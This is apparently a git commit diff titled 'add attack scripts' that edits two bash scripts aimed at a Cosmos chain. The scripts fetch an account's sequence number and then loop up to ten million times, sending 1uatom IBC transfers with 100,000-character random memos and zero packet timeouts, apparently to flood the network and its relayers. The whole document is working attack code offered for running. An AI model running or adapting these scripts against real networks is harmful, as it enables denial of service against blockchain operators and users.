a73cd494eb367318f8f5327507be50f29cd14af4
Jacob Gadikian <jacobgadikian@gmail.com>
2023-10-06 13:49:50 +0200

    add attack scripts

--- attack.bash
+++ attack.bash
@@ -1,10 +1,22 @@
-set -e
+set -ue
 
 SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq | jq --raw-output ' .account.sequence ')
 
-for i in $( eval echo {"$SEQUENCE"..10000000} )
-	 do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1505075 --yes --fees 3763uatom --sequence $i
 
-	sleep .2
-	
+for i in $( eval echo {"$SEQUENCE"..10000000} )
+
+do
+
+	gaiad tx ibc-transfer transfer transfer channel-58 neutron1083svrca4t350mphfv9x45wq9asrs60cvs77fx 1uatom --from cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1109809 --yes --fees 2775uatom --sequence $i  --packet-timeout-timestamp 0 &> attack.log
+
+cat attack.log
+
+	if [ $(grep -c "mismatch" attack.log) -eq 1 ]
+	then
+		echo "sequence number mismatch"
+		break
+	fi
+
 done
+
+echo "if you're running it right the script just restarted"
--- attack3.bash
+++ attack3.bash
@@ -1,39 +1,22 @@
 set -ue
 
-# main loop
-loop () {
+SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 | jq --raw-output ' .account.sequence ')
+
+
 for i in $( eval echo {"$SEQUENCE"..10000000} )
 
 do
 
-	gaiad tx ibc-transfer transfer transfer channel-58 cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 1uatom --from test3 --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1109809 --yes --fees 2775uatom --sequence $i  --packet-timeout-timestamp 0 &2> attack3.log
+	gaiad tx ibc-transfer transfer transfer channel-58 cosmos1fjzgfyt8way9sp7hktnv2jv73j697gvz3fyptm 1uatom --from test3 --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1109809 --yes --fees 2775uatom --sequence $i  --packet-timeout-timestamp 0 &> attack3.log
 
-	# get sequence number if we've had an account sequence mismatch
-	if grep -q expected attack3.log; then
-		echo "sequence mismatch at $i, getting new sequence number"
+cat attack2.log
+
+	if [ $(grep -c "mismatch" attack3.log) -eq 1 ]
+	then
+		echo "sequence number mismatch"
 		break
 	fi
 
-	cat attack3.log
-
-done
-}
-
-
-# get sequence number 
-sequence () {
-
-SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos18hmramafeyg3xu3j8m6s4w38sgt93r29v7c8d5 | jq --raw-output ' .account.sequence ')
-echo "new sequence number is $SEQUENCE"
-loop
-
-}
-
-while true; do
-
-	# get new sequence number and call main loop
-	sequence
-
 done
 
-
+echo "if you're running it right the script just restarted"
